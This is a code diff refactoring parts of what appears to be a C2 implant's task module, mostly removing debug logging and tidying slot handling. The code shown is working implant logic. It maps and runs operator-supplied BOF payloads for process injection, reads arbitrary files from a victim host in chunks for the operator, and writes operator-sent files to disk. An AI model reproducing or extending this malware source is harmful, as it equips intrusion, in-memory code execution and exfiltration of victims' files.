@@ -119,39 +119,27 @@ auto DECLFN Task::Dispatcher( VOID ) -> VOID {
 auto DECLFN Task::Postex(
     _In_ JOBS* Job
 ) -> ERROR_CODE {
-    KhDbg("ENTER - Job UUID: %s", Job->UUID);
-
     PARSER*  Parser  = Job->Psr;
     PACKAGE* Package = Job->Pkg;
 
-    KhDbg("Parser: %p, Package: %p", Parser, Package);
-    KhDbg("Parser->Buffer: %p, Parser->Length: %d", Parser ? Parser->Buffer : nullptr, Parser ? Parser->Length : 0);
-
     ULONG SubCmd = Self->Psr->Int32( Parser );
 
-    if ( ! SubCmd ) SubCmd = Self->Postex.SubId;
-
-    Self->Pkg->Int32( Package, SubCmd );
+    if ( ! SubCmd ) SubCmd = (ULONG)Action::Postex::Poll;
 
     KhDbg("SubCmd: %d", SubCmd);
 
     switch ( (Action::Postex)SubCmd ) {
 
     case Action::Postex::Inject: {
-        KhDbg("ENTER");
-        KhDbg("Parser before Bytes: Buffer=%p, Length=%d", Parser->Buffer, Parser->Length);
+        Self->Pkg->Int32( Package, SubCmd );
 
         ULONG BofLen  = 0;
         PBYTE BofData = Self->Psr->Bytes( Parser, &BofLen );
 
-        KhDbg("BofData: %p, BofLen: %d, IsLoaded: %d", BofData, BofLen, Self->Postex.IsLoaded);
-
         if ( BofLen > 0 && !Self->Postex.IsLoaded ) {
-            KhDbg("First time loading PostexKit");
-
             Self->Postex.Mapped = (COFF_MAPPED*)KhAlloc( sizeof(COFF_MAPPED) );
 
-            if ( !Self->Cf->Map( BofData, BofLen, Self->Postex.Mapped ) ) {
+            if ( ! Self->Cf->Map( BofData, BofLen, Self->Postex.Mapped ) ) {
                 KhDbg("ERROR: Failed to map BOF");
                 Self->Pkg->Int32( Package, 0 );
                 return KhGetError;
@@ -181,9 +169,7 @@ auto DECLFN Task::Postex(
             KhDbg("PostexKit loaded, poll job created");
         }
 
-        if ( !Self->Postex.IsLoaded || !Self->Postex.fn_inject ) {
-            KhDbg("ERROR: Not loaded or fn_inject is null (IsLoaded=%d, fn_inject=%p)",
-                Self->Postex.IsLoaded, Self->Postex.fn_inject);
+        if ( ! Self->Postex.IsLoaded || ! Self->Postex.fn_inject ) {
             Self->Pkg->Int32( Package, 0 );
             return KhGetError;
         }
@@ -191,11 +177,10 @@ auto DECLFN Task::Postex(
         ULONG ArgsLen = 0;
         PBYTE Args    = (PBYTE)Self->Psr->Bytes( Parser, &ArgsLen );
 
-        KhDbg("Calling go_inject with Args=%p, ArgsLen=%d", Args, ArgsLen);
-
+        Self->Config.Postex.CurrentUUID = Job->UUID;
         ((BOOL(*)(char*, int))Self->Postex.fn_inject)( (char*)Args, ArgsLen );
+        Self->Config.Postex.CurrentUUID = nullptr;
 
-        KhDbg("go_inject returned");
         Self->Pkg->Int32( Package, 1 );
 
         Self->Postex.SubId = (INT32)Action::Postex::Poll;
@@ -204,19 +189,13 @@ auto DECLFN Task::Postex(
     }
 
     case Action::Postex::Poll: {
-        KhDbg("ENTER (IsLoaded=%d, fn_poll=%p)", Self->Postex.IsLoaded, Self->Postex.fn_poll);
-
         if ( !Self->Postex.IsLoaded || !Self->Postex.fn_poll ) {
             KhDbg("Not loaded, marking job for cleanup");
             Job->Clean = TRUE;
             return KhRetSuccess;
         }
 
-        KhDbg("Calling go_poll");
-
         BOOL clean = ((BOOL(*)(char*, int))Self->Postex.fn_poll)( nullptr, 0 );
-
-        KhDbg("go_poll returned to clean %s", clean ? "TRUE" : "FALSE");
 
         if ( clean ) {
             Self->Cf->Unmap( Self->Postex.Mapped );
@@ -232,10 +211,6 @@ auto DECLFN Task::Postex(
     }
 
     case Action::Postex::Cleanup: {
-        KhDbg("ENTER", 
-            SubCmd == (ULONG)Action::Postex::Kill ? "Kill" : 
-            SubCmd == (ULONG)Action::Postex::List ? "List" : "Cleanup");
-
         PVOID fn = nullptr;
 
         switch ( (Action::Postex)SubCmd ) {
@@ -245,30 +220,25 @@ auto DECLFN Task::Postex(
             default: break;
         }
 
-        if ( !Self->Postex.IsLoaded || !fn ) {
-            KhDbg("ERROR: Not loaded or fn is null");
+        if ( ! Self->Postex.IsLoaded || !fn ) {
+            KhDbg("Not loaded or fn is null");
             return KhGetError;
         }
 
         PBYTE Args    = (SubCmd == (ULONG)Action::Postex::Kill) ? (PBYTE)Parser->Buffer : nullptr;
         ULONG ArgsLen = (SubCmd == (ULONG)Action::Postex::Kill) ? Parser->Length : 0;
 
-        KhDbg("Calling subcmd %d with Args=%p, ArgsLen=%d", SubCmd, Args, ArgsLen);
-
         ((void(*)(char*, int))fn)( (char*)Args, ArgsLen );
-
-        KhDbg("subcmd %d returned", SubCmd);
         break;
     }
 
     default: {
-        KhDbg("ERROR: Unknown SubCmd: %d", SubCmd);
+        KhDbg("Unknown SubCmd: %d", SubCmd);
         break;
     }
 
     }
 
-    KhDbg("EXIT");
     return KhRetSuccess;
 }
 
@@ -324,67 +294,69 @@ auto DECLFN Task::ProcessDownloads(
     ULONG StartEvtLen = 0;
 
 	for (INT i = 0; i < 30; i++) {
-        if ( Self->Tsp->Down[i].FileID && Str::LengthA( Self->Tsp->Down[i].FileID ) ) {
+        auto& Slot = Self->Tsp->Down[i];
 
-            if (Self->Tsp->Down[i].CurChunk > Self->Tsp->Down[i].TotalChunks) {
+        if ( Slot.FileID && Str::LengthA( Slot.FileID ) ) {
+
+            if ( Slot.CurChunk > Slot.TotalChunks ) {
                 KhDbg("SHOULD NEVER BE REACHED");
-                Self->Tsp->Down[i].FileID = "";
+                Slot.FileID = "";
                 continue;
             }
 
-            ULONG chunksize = Self->Tsp->Down[i].ChunkSize;
-            ULONG Offset = (Self->Tsp->Down[i].CurChunk - 1) * Self->Tsp->Down[i].ChunkSize;
-            KhDbg("Reading chunk %d/%d for file ID %s at offset %lu", Self->Tsp->Down[i].CurChunk, Self->Tsp->Down[i].TotalChunks, Self->Tsp->Down[i].FileID, Offset);
+            ULONG chunksize = Slot.ChunkSize;
+            ULONG Offset = (Slot.CurChunk - 1) * Slot.ChunkSize;
+            KhDbg("Reading chunk %d/%d for file ID %s at offset %lu", Slot.CurChunk, Slot.TotalChunks, Slot.FileID, Offset);
 
             ULONG Result = (ULONG)Self->Krnl32.SetFilePointer(
-                Self->Tsp->Down[i].FileHandle,
-                (LONG)Offset,   // low-order 32 bits
-                NULL,           // high-order 32 bits (must be NULL for <4GB)
+                Slot.FileHandle,
+                (LONG)Offset,
+                NULL,
                 FILE_BEGIN
             );
 
             BYTE* FileBuffer = B_PTR( KhAlloc( chunksize ) );
             ULONG BytesRead  = 0;
 
-            if ( ! Self->Krnl32.ReadFile( Self->Tsp->Down[i].FileHandle, FileBuffer, chunksize, &BytesRead, 0 ) || BytesRead == 0 ) {
+            if ( ! Self->Krnl32.ReadFile( Slot.FileHandle, FileBuffer, chunksize, &BytesRead, 0 ) || BytesRead == 0 ) {
                 CHAR* ErrorMsg = "Failed to read from file";
                 KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);
 
-                Self->Ntdll.NtClose( Self->Tsp->Down[i].FileHandle );
+                Self->Ntdll.NtClose( Slot.FileHandle );
                 KhFree(FileBuffer);
 
-                Events[StartEvtLen].FileID = Self->Tsp->Down[i].FileID;
+                Events[StartEvtLen].FileID = Slot.FileID;
                 Events[StartEvtLen].ErrorCode = 1;
                 CHAR* Reason = "CHUNK_READ_ERROR";
                 Events[StartEvtLen].Reason = Reason;
                 StartEvtLen++;
 
-                if ( Self->Tsp->Down[i].Path ) KhFree( Self->Tsp->Down[i].Path );
-                Self->Tsp->Down[i].FileID = nullptr;
-                Self->Tsp->Down[i].Path = nullptr;
+                if ( Slot.Path ) KhFree( Slot.Path );
+                Slot.FileID = nullptr;
+                Slot.Path   = nullptr;
 
                 QuickErr( ErrorMsg );
                 continue;
             }
 
-            Events[StartEvtLen].FileID = Self->Tsp->Down[i].FileID;
-            Events[StartEvtLen].ErrorCode = 0;
-            Events[StartEvtLen].Data = FileBuffer;
-            Events[StartEvtLen].DataLen = BytesRead;
-            Events[StartEvtLen].CurChunk = Self->Tsp->Down[i].CurChunk;
-            Events[StartEvtLen].TotalChunks = Self->Tsp->Down[i].TotalChunks;
+            Events[StartEvtLen].FileID      = Slot.FileID;
+            Events[StartEvtLen].ErrorCode   = 0;
+            Events[StartEvtLen].Data        = FileBuffer;
+            Events[StartEvtLen].DataLen     = BytesRead;
+            Events[StartEvtLen].CurChunk    = Slot.CurChunk;
+            Events[StartEvtLen].TotalChunks = Slot.TotalChunks;
             StartEvtLen++;
 
-            BOOL IsFinalChunk = (Self->Tsp->Down[i].CurChunk == Self->Tsp->Down[i].TotalChunks);
+            BOOL IsFinalChunk = (Slot.CurChunk == Slot.TotalChunks);
             
             if ( ! IsFinalChunk ) {
-                Self->Tsp->Down[i].CurChunk = Self->Tsp->Down[i].CurChunk + 1;
+                Slot.CurChunk = Slot.CurChunk + 1;
             } else {
-                Self->Ntdll.NtClose(Self->Tsp->Down[i].FileHandle);
+                Self->Ntdll.NtClose( Slot.FileHandle );
                 
-                if ( Self->Tsp->Down[i].Path ) KhFree( Self->Tsp->Down[i].Path );
-                Self->Tsp->Down[i].FileID = nullptr;
-                Self->Tsp->Down[i].Path = nullptr;
+                if ( Slot.Path ) KhFree( Slot.Path );
+                Slot.FileID = nullptr;
+                Slot.Path   = nullptr;
                 Self->Tsp->DownloadTasksCount--;
             }
         }
@@ -408,10 +380,6 @@ auto DECLFN Task::ProcessDownloads(
                 KhDbg("Processing TaskPacking for - FileID: %s, Error code: %d", Events[i].FileID, Events[i].ErrorCode);
                 Self->Pkg->Int32(Job->Pkg, Events[i].DataLen);
                 KhDbg("Data Length: %d", Events[i].DataLen);
-                // KhDbg( "Job Package Bytes for FileID: %s",  Events[i].FileID);
-                // for ( INT j = 0; j < Events[i].DataLen; j++ ) {
-                //     KhDbg( "%02X ", (Events[i].Data)[j] );
-                // }
                 Self->Pkg->Bytes(Job->Pkg, Events[i].Data, Events[i].DataLen);
                 Self->Pkg->Int32(Job->Pkg, Events[i].CurChunk);
                 KhDbg("Current Chunk: %d", Events[i].CurChunk);
@@ -450,8 +418,8 @@ auto DECLFN Task::Download(
     FileID = Self->Psr->Str( Parser, 0 );
     if ( ! FileID || ! Str::LengthA( FileID ) ) {
         Self->Pkg->Str( Package, FileID );
-        Self->Pkg->Int32( Package, 1 ); // Error
-        Self->Pkg->Str( Package, "INVALID_FILE_ID" ); // Reason
+        Self->Pkg->Int32( Package, 1 );
+        Self->Pkg->Str( Package, "INVALID_FILE_ID" );
 
         QuickErr( "Invalid file ID" );
         return KhRetSuccess;
@@ -461,10 +429,9 @@ auto DECLFN Task::Download(
     KhDbg("Download file Path: %s", FilePath);
 
     if ( ! FilePath || ! Str::LengthA( FilePath ) ) {
-
         Self->Pkg->Str( Package, FileID );
-        Self->Pkg->Int32( Package, 1 ); // Error
-        Self->Pkg->Str( Package, "INVALID_FILE_PATH" ); // Reason
+        Self->Pkg->Int32( Package, 1 );
+        Self->Pkg->Str( Package, "INVALID_FILE_PATH" );
 
         QuickErr( "Invalid file path" );
         return KhRetSuccess;
@@ -476,8 +443,8 @@ auto DECLFN Task::Download(
 
     if ( FileHandle == INVALID_HANDLE_VALUE ) {
         Self->Pkg->Str( Package, FileID );
-        Self->Pkg->Int32( Package, 1 ); // Error
-        Self->Pkg->Str( Package, "INVALID_FILE_HANDLE" ); // Reason
+        Self->Pkg->Int32( Package, 1 );
+        Self->Pkg->Str( Package, "INVALID_FILE_HANDLE" );
 
         QuickErr( "Failed to open file for reading" );
         return KhRetSuccess;
@@ -496,8 +463,8 @@ auto DECLFN Task::Download(
 
     if ( Index == -1 ) {
         Self->Pkg->Str( Package, FileID );
-        Self->Pkg->Int32( Package, 1 ); // Error
-        Self->Pkg->Str( Package, "MAX_DOWNLOADS_REACHED" ); // Reason
+        Self->Pkg->Int32( Package, 1 );
+        Self->Pkg->Str( Package, "MAX_DOWNLOADS_REACHED" );
 
         QuickErr( "Maximum concurrent uploads (30) reached" );
         Self->Ntdll.NtClose( FileHandle );
@@ -508,20 +475,20 @@ auto DECLFN Task::Download(
 
     ULONG FileIDLen  = Str::LengthA( FileID );
     CHAR* FileIDCopy = (CHAR*)KhAlloc( FileIDLen + 1 );
-
     Str::CopyA( FileIDCopy, FileID );
 
     ULONG FilePathLen  = Str::LengthA( FilePath );
     CHAR* FilePathCopy = (CHAR*)KhAlloc( FilePathLen + 1 );
-
     Str::CopyA( FilePathCopy, FilePath );
 
-    Self->Tsp->Down[Index].FileID      = FileIDCopy;
-    Self->Tsp->Down[Index].ChunkSize   = chunksize; 
-    Self->Tsp->Down[Index].CurChunk    = 1;
-    Self->Tsp->Down[Index].TotalChunks = (FileSize + chunksize - 1) / chunksize;
-    Self->Tsp->Down[Index].Path        = FilePathCopy;
-    Self->Tsp->Down[Index].FileHandle  = FileHandle;
+    auto& Slot = Self->Tsp->Down[Index];
+
+    Slot.FileID      = FileIDCopy;
+    Slot.ChunkSize   = chunksize; 
+    Slot.CurChunk    = 1;
+    Slot.TotalChunks = (FileSize + chunksize - 1) / chunksize;
+    Slot.Path        = FilePathCopy;
+    Slot.FileHandle  = FileHandle;
 
     Self->Tsp->DownloadTasksCount++;
 
@@ -531,7 +498,7 @@ auto DECLFN Task::Download(
         BYTE*   TmpBufDownload = (BYTE*)KhAlloc( sizeof(UINT16) );
         UINT16  CmdDownload    = (UINT16)Action::Task::ProcessDownloads;
         JOBS*   NewJobDownload = nullptr;
-        // 4-byte big-endian length
+
         TmpBufDownload[0] = (CmdDownload     ) & 0xFF;
         TmpBufDownload[1] = (CmdDownload >> 8) & 0xFF;
 
@@ -542,7 +509,6 @@ auto DECLFN Task::Download(
         }
     
         Self->Psr->New( TmpPsrDownload, TmpBufDownload, sizeof(UINT16) );
-
         KhFree( TmpBufDownload );
     
         NewJobDownload = Self->Jbs->Create( Self->Jbs->DownloadUUID, TmpPsrDownload, TRUE );
@@ -598,13 +564,15 @@ auto DECLFN Task::Upload(
 
             KhDbg("file path: %s", FilePath);
 
-            Self->Tsp->Up[Index].FileID = FileID;
-            Self->Tsp->Up[Index].Path   = FilePath;
-            Self->Tsp->Up[Index].CurChunk = 0;
-            Self->Tsp->Up[Index].BytesReceived = 0;
-            Self->Tsp->Up[Index].TotalChunks = 0; 
+            auto& Slot = Self->Tsp->Up[Index];
 
-            Self->Pkg->Int32( Package, 1 ); // Start with chunk 1
+            Slot.FileID        = FileID;
+            Slot.Path          = FilePath;
+            Slot.CurChunk      = 0;
+            Slot.BytesReceived = 0;
+            Slot.TotalChunks   = 0; 
+
+            Self->Pkg->Int32( Package, 1 );
             Self->Pkg->Str( Package, FileID );
             Self->Pkg->Str( Package, FilePath );
             Self->Pkg->Int32( Package, KH_CHUNK_SIZE );
@@ -649,18 +617,17 @@ auto DECLFN Task::Upload(
 
             KhDbg("FIleIndex: %d", FileIndex);
 
-            if (
-                ! Self->Tsp->Up[FileIndex].FileHandle || Self->Tsp->Up[FileIndex].FileHandle == INVALID_HANDLE_VALUE
-            ) {
-                Self->Tsp->Up[FileIndex].FileHandle = Self->Krnl32.CreateFileA(
-                    Self->Tsp->Up[FileIndex].Path, FILE_APPEND_DATA,
+            auto& Slot = Self->Tsp->Up[FileIndex];
+
+            if ( ! Slot.FileHandle || Slot.FileHandle == INVALID_HANDLE_VALUE ) {
+                Slot.FileHandle = Self->Krnl32.CreateFileA(
+                    Slot.Path, FILE_APPEND_DATA,
                     FILE_SHARE_READ, nullptr, OPEN_ALWAYS,
                     FILE_ATTRIBUTE_NORMAL, nullptr
                 );
                 KhDbg("Created File Handle");
-                
 
-                if (Self->Tsp->Up[FileIndex].FileHandle == INVALID_HANDLE_VALUE) {
+                if ( Slot.FileHandle == INVALID_HANDLE_VALUE ) {
                     CHAR* ErrorMsg = "Failed to create/open file";
                     KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);
                     QuickErr( ErrorMsg );
@@ -669,13 +636,13 @@ auto DECLFN Task::Upload(
             }
 
             Self->Krnl32.SetFilePointer(
-                Self->Tsp->Up[FileIndex].FileHandle,
+                Slot.FileHandle,
                 0, nullptr, FILE_END
             );
 
             DWORD bytesWritten;
             BOOL  writeResult = Self->Krnl32.WriteFile(
-                Self->Tsp->Up[FileIndex].FileHandle,
+                Slot.FileHandle,
                 ChunkData, ChunkSize, &bytesWritten, nullptr
             );
             KhDbg("bytesWritten: %lu", bytesWritten);
@@ -686,45 +653,45 @@ auto DECLFN Task::Upload(
                 KhDbg("%s (Error: %d)", ErrorMsg, KhGetError);
                 QuickErr( ErrorMsg );
                 
-                if ( Self->Tsp->Up[FileIndex].FileHandle != INVALID_HANDLE_VALUE ) {
-                    Self->Ntdll.NtClose( Self->Tsp->Up[FileIndex].FileHandle );
-                    Self->Tsp->Up[FileIndex].FileHandle = INVALID_HANDLE_VALUE;
+                if ( Slot.FileHandle != INVALID_HANDLE_VALUE ) {
+                    Self->Ntdll.NtClose( Slot.FileHandle );
+                    Slot.FileHandle = INVALID_HANDLE_VALUE;
                 }
                 
                 return KhRetSuccess;
             }
 
-            Self->Tsp->Up[FileIndex].CurChunk       = ChunkNumber;
-            Self->Tsp->Up[FileIndex].BytesReceived += bytesWritten;
-            Self->Tsp->Up[FileIndex].TotalChunks    = TotalChunks;
+            Slot.CurChunk       = ChunkNumber;
+            Slot.BytesReceived += bytesWritten;
+            Slot.TotalChunks    = TotalChunks;
 
             KhDbg("Chunk %d/%d (%d bytes) written to %s", 
                 ChunkNumber, TotalChunks, bytesWritten, FileID);
 
             if ( ChunkNumber == TotalChunks || ChunkSize < KH_CHUNK_SIZE ) {
                 QuickMsg(
-                    "Upload completed: %s (%d bytes total)", 
-                    FileID, Self->Tsp->Up[FileIndex].BytesReceived 
+                    "Upload completed ID: %s (%d bytes total)", 
+                    FileID, Slot.BytesReceived 
                 );
 
-                if ( Self->Tsp->Up[FileIndex].FileHandle != INVALID_HANDLE_VALUE ) {
-                    Self->Ntdll.NtClose( Self->Tsp->Up[FileIndex].FileHandle );
-                    Self->Tsp->Up[FileIndex].FileHandle = INVALID_HANDLE_VALUE;
+                if ( Slot.FileHandle != INVALID_HANDLE_VALUE ) {
+                    Self->Ntdll.NtClose( Slot.FileHandle );
+                    Slot.FileHandle = INVALID_HANDLE_VALUE;
                 }
 
-                if ( Self->Tsp->Up[FileIndex].FileID ) {
-                    KhFree( Self->Tsp->Up[FileIndex].FileID );
-                    Self->Tsp->Up[FileIndex].FileID = nullptr;
+                if ( Slot.FileID ) {
+                    KhFree( Slot.FileID );
+                    Slot.FileID = nullptr;
                 }
                 
-                if ( Self->Tsp->Up[FileIndex].Path ) {
-                    KhFree( Self->Tsp->Up[FileIndex].Path );
-                    Self->Tsp->Up[FileIndex].Path = nullptr;
+                if ( Slot.Path ) {
+                    KhFree( Slot.Path );
+                    Slot.Path = nullptr;
                 }
-                Self->Tsp->Up[FileIndex].FileID = "";
-                Self->Tsp->Up[FileIndex].CurChunk = 0;
-                Self->Tsp->Up[FileIndex].BytesReceived = 0;
-                Self->Tsp->Up[FileIndex].TotalChunks = 0;
+                Slot.FileID        = "";
+                Slot.CurChunk      = 0;
+                Slot.BytesReceived = 0;
+                Slot.TotalChunks   = 0;
             }
 
             break;
